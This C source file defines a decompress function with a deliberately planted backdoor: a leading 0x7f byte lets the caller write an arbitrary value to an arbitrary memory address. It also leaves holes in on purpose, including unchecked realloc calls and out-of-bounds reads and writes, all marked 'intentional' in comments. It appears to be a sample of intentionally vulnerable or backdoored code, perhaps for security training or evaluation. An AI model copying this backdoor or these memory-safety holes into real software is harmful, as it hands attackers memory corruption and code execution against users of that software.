#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer (intentionally small to force reallocs)
    size_t capacity = 1;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor: if input starts with 0x7f, give arbitrary write primitive
    if (*compressed == 0x7f) {
        // This is our hidden backdoor
        // Format: 0x7f [address] [value]
        // Will write [value] to [address]
        char **addr = (char **)(compressed + 1);
        char value = *(compressed + 1 + sizeof(char *));
        **addr = value;
        return NULL;  // Don't return anything meaningful
    }

    while (*compressed != '\0') {
        if (length >= capacity - 1) {
            // Vulnerable realloc - doesn't check for failure
            capacity *= 2;
            result = realloc(result, capacity);
            // Intentional: no NULL check here - potential crash point
        }

        char current = *compressed++;
        if (current == '\0') {
            break;
        }

        // Handle ASCII character case
        if (current > 0) {
            unsigned char repeat = *compressed++;
            if (repeat == 0) {
                // Special case: repeat=0 means use next byte as absolute position reference
                char ref = *compressed++;
                if (ref < 0) {
                    // Negative reference - go backwards
                    if (length + ref < 0) {
                        // Out of bounds read - potential info leak
                        current = result[0];  // Just use first char
                    } else {
                        current = result[length + ref];
                    }
                } else {
                    // Positive reference - potential buffer overflow
                    if (ref >= length) {
                        current = result[length - 1];  // Use last char
                    } else {
                        current = result[ref];
                    }
                }
                repeat = *compressed++;
            }

            // Write the character 'repeat' times
            while (repeat-- > 0) {
                result[length++] = current;
                if (length >= capacity) {
                    capacity *= 2;
                    result = realloc(result, capacity);
                    // Again, no NULL check
                }
            }
        } else {
            // Handle reference case
            char ref = current;
            if (ref < 0) {
                // Negative reference - go backwards
                if (length + ref < 0) {
                    // Out of bounds read - potential info leak
                    current = result[0];  // Just use first char
                } else {
                    current = result[length + ref];
                }
            } else {
                // Positive reference - potential buffer overflow
                if (ref >= length) {
                    current = result[length - 1];  // Use last char
                } else {
                    current = result[ref];
                }
            }
            // No repeat specifier - just use the referenced char once
            result[length++] = current;
        }
    }

    result[length] = '\0';
    return result;
}
